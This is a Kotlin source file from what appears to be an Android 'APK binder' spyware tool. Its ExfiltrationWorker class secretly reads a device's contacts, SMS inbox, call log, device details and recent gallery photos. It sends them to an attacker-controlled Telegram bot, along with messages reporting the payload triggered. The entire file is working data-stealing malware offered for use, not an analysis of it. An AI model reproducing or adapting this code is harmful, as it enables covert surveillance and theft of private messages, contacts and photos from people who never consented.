package Com.devhs.apkbinder.worker

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.os.Build
import Com.devhs.apkbinder.network.TelegramApiService
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.io.FileOutputStream

class ExfiltrationWorker(
    private val context: Context,
    private val botToken: String,
    private val chatId: String
) {
    private val api = TelegramApiService.create(botToken)

    suspend fun executeExfiltration(features: List<String>) = withContext(Dispatchers.IO) {
        try {
            api.sendMessage(chatId, "[INFO] Hs Apk Binder: Payload triggered successfully on device.")

            if (features.contains("Device Info")) {
                val deviceInfo = getDeviceInfo()
                sendFileToTelegram(deviceInfo, "device_info.txt", "Device Information - Developer By Hs")
            }

            if (features.contains("Contacts")) {
                val contacts = getContactsData()
                sendFileToTelegram(contacts, "contacts.txt", "Contacts List - Developer By Hs")
            }

            if (features.contains("SMS")) {
                val sms = getSmsData()
                sendFileToTelegram(sms, "sms_logs.txt", "SMS Logs - Developer By Hs")
            }

            if (features.contains("Call List")) {
                val calls = getCallLogData()
                sendFileToTelegram(calls, "call_logs.txt", "Call List - Developer By Hs")
            }

            if (features.contains("Gallery")) {
                sendGalleryPhotos()
            }

            api.sendMessage(chatId, "[SUCCESS] All selected payloads executed and exfiltrated successfully.")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun getDeviceInfo(): String {
        return '''
            --- Device Information ---
            Model: ${Build.MODEL}
            Manufacturer: ${Build.MANUFACTURER}
            Brand: ${Build.BRAND}
            Device: ${Build.DEVICE}
            Android Version: ${Build.VERSION.RELEASE}
            SDK Int: ${Build.VERSION.SDK_INT}
        '''.trimIndent()
    }

    private fun getContactsData(): String {
        val sb = StringBuilder()
        val cursor: Cursor? = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        cursor?.use {
            val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (it.moveToNext()) {
                val name = if (nameIdx != -1) it.getString(nameIdx) else "Unknown"
                val number = if (numberIdx != -1) it.getString(numberIdx) else "Unknown"
                sb.append("Name: $name | Number: $number\n")
            }
        }
        return sb.toString()
    }

    private fun getSmsData(): String {
        val sb = StringBuilder()
        val cursor: Cursor? = context.contentResolver.query(
            Uri.parse("content://sms/inbox"),
            null, null, null, null
        )
        cursor?.use {
            val addressIdx = it.getColumnIndex("address")
            val bodyIdx = it.getColumnIndex("body")
            while (it.moveToNext()) {
                val address = if (addressIdx != -1) it.getString(addressIdx) else "Unknown"
                val body = if (bodyIdx != -1) it.getString(bodyIdx) else ""
                sb.append("From: $address\nBody: $body\n-------------------\n")
            }
        }
        return sb.toString()
    }

    private fun getCallLogData(): String {
        val sb = StringBuilder()
        val cursor: Cursor? = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null, null, null, CallLog.Calls.DATE + " DESC"
        )
        cursor?.use {
            val numberIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
            val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
            val durationIdx = it.getColumnIndex(CallLog.Calls.DURATION)
            while (it.moveToNext()) {
                val number = if (numberIdx != -1) it.getString(numberIdx) else "Unknown"
                val type = if (typeIdx != -1) it.getString(typeIdx) else "0"
                val duration = if (durationIdx != -1) it.getString(durationIdx) else "0"
                sb.append("Number: $number | Type: $type | Duration: ${duration}s\n")
            }
        }
        return sb.toString()
    }

    private suspend fun sendGalleryPhotos() {
        val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA)
        val cursor = context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC"
        )
        cursor?.use {
            val dataIdx = it.getColumnIndex(MediaStore.Images.Media.DATA)
            var count = 0
            while (it.moveToNext() && count < 10) {
                if (dataIdx != -1) {
                    val filePath = it.getString(dataIdx)
                    val file = File(filePath)
                    if (file.exists()) {
                        val reqFile = file.asRequestBody("image/*".toMediaTypeOrNull())
                        val body = MultipartBody.Part.createFormData("photo", file.name, reqFile)
                        val caption = "Developer By Hs".toRequestBody("text/plain".toMediaTypeOrNull())
                        try {
                            api.sendPhoto(chatId, body, caption)
                        } catch (e: Exception) {
                            e.printStackTrace()
                        }
                        count++
                    }
                }
            }
        }
    }

    private suspend fun sendFileToTelegram(content: String, fileName: String, captionText: String) {
        val file = File(context.cacheDir, fileName)
        FileOutputStream(file).use { it.write(content.toByteArray()) }

        val reqFile = file.asRequestBody("text/plain".toMediaTypeOrNull())
        val body = MultipartBody.Part.createFormData("document", file.name, reqFile)
        val caption = captionText.toRequestBody("text/plain".toMediaTypeOrNull())

        try {
            api.sendDocument(chatId, body, caption)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
